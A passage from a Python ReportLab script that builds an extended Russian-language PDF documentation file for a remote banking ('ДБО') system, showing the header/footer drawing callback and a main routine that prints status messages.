        canvas.setFillColor(HexColor('#6b7280'))
        canvas.drawString(50, 30, f"Страница {doc.page}")
        canvas.drawRightString(A4[0] - 50, 30, f"Версия 1.0 - {datetime.now().strftime('%d.%m.%Y')}")
        
        canvas.setStrokeColor(HexColor('#e5e7eb'))
        canvas.line(50, A4[1] - 40, A4[0] - 50, A4[1] - 40)
        canvas.line(50, 40, A4[0] - 50, 40)
        
        canvas.restoreState()
    
    # Сборка PDF
    doc.build(elements, onFirstPage=add_header_footer, onLaterPages=add_header_footer)
    
    print("Расширенная PDF документация создана: ДБО_Система_Документация_Расширенная.pdf")

if __name__ == "__main__":
    print("Расширенный генератор PDF документации для системы ДБО")
    print("=" * 60)
    
    try:
        create_extended_pdf()
        print("\n✅ Расширенная документация успешно создана!")
        print("📄 Файл: ДБО_Система_Документация_Расширенная.pdf")
        print("📊 Объем: ~50 страниц с подробным описанием")
        print("🔤 Поддержка кириллицы: Включена")
    except Exception as e:
        print(f"\n❌ Ошибка при создании PDF: {e}")
        sys.exit(1)
